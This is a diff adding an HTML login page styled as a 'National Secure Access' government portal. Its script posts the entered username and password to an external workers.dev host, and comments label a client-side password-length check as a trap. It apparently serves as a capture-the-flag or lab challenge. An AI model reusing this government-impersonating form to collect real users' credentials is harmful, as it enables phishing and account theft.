@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>National Secure Access Portal</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      background: linear-gradient(135deg, #0a1220, #020409);
+      color: #e6eef7;
+      font-family: "Segoe UI", system-ui, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .card {
+      background: rgba(15, 25, 45, 0.95);
+      width: 100%;
+      max-width: 420px;
+      padding: 32px;
+      border-radius: 10px;
+      box-shadow: 0 0 40px rgba(0, 0, 0, 0.6);
+      border: 1px solid rgba(255, 255, 255, 0.05);
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 24px;
+    }
+
+    .header h1 {
+      font-size: 1.2rem;
+      letter-spacing: 1px;
+      margin-bottom: 6px;
+    }
+
+    .header p {
+      font-size: 0.85rem;
+      opacity: 0.7;
+    }
+
+    label {
+      display: block;
+      margin-top: 16px;
+      font-size: 0.85rem;
+      opacity: 0.85;
+    }
+
+    input {
+      width: 100%;
+      margin-top: 6px;
+      padding: 10px;
+      border-radius: 6px;
+      border: 1px solid #2b3c5a;
+      background: #0b1424;
+      color: #e6eef7;
+      font-size: 0.9rem;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #4a7cff;
+    }
+
+    button {
+      width: 100%;
+      margin-top: 24px;
+      padding: 12px;
+      border: none;
+      border-radius: 6px;
+      background: #1f4fd8;
+      color: white;
+      font-size: 0.95rem;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background: #2a63ff;
+    }
+
+    .msg {
+      margin-top: 16px;
+      font-size: 0.85rem;
+      text-align: center;
+      opacity: 0.9;
+    }
+
+    footer {
+      margin-top: 18px;
+      text-align: center;
+      font-size: 0.7rem;
+      opacity: 0.4;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="card">
+    <div class="header">
+      <h1>NATIONAL SECURE ACCESS</h1>
+      <p>Authorized Government Personnel Only</p>
+    </div>
+
+    <label for="username">Username</label>
+    <input id="username" autocomplete="off" />
+
+    <label for="password">Password</label>
+    <input id="password" type="password" />
+
+    <button onclick="login()">Authenticate</button>
+
+    <div class="msg" id="msg"></div>
+
+    <footer>
+      © Ministry of Digital Infrastructure<br />
+      Internal System v3.9
+    </footer>
+  </div>
+
+<script>
+function login() {
+  const user = document.getElementById("username").value;
+  const pass = document.getElementById("password").value;
+
+  // ❌ FAKE SECURITY CHECK (jebakan)
+  if (pass.length < 8 || pass.length > 12) {
+    document.getElementById("msg").innerText =
+      "Password does not meet security policy.";
+    return;
+  }
+
+  fetch("https://main.whiskasreal.workers.dev/api/login", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ username: user, password: pass })
+  })
+    .then(r => r.json())
+    .then(d => {
+      document.getElementById("msg").innerText = d.message;
+      if (d.success) location.href = "/dashboard";
+    })
+    .catch(() => {
+      document.getElementById("msg").innerText = "Network error.";
+    });
+}
+
+// frontend validation is not enforcement
+</script>
+</body>
+</html>
